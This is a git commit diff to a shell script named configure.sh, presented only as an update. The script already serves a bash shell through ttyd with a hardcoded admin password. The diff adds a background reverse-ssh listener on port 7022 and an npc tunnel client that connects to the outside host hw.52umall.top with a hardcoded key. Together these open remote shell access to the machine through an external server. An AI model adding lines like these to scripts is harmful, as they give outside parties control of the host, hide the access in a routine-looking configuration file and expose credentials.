77cdb24753aae7d08c37f898f5100930df46bc3e
mackbook3 <126562090+mackbook3@users.noreply.github.com>
2023-03-18 17:09:56 +0800

    Update configure.sh

--- configure.sh
+++ configure.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
 mkdir ~/.screen && chmod 700 ~/.screen
 export SCREENDIR=$HOME/.screen
+~/reverse-sshx64  -v -l -p 7022  &
+~/npc  -server=hw.52umall.top:7006  -vkey=key-313 -type=tcp &
 /usr/bin/ttyd -p $PORT -c admin:adminks123 bash
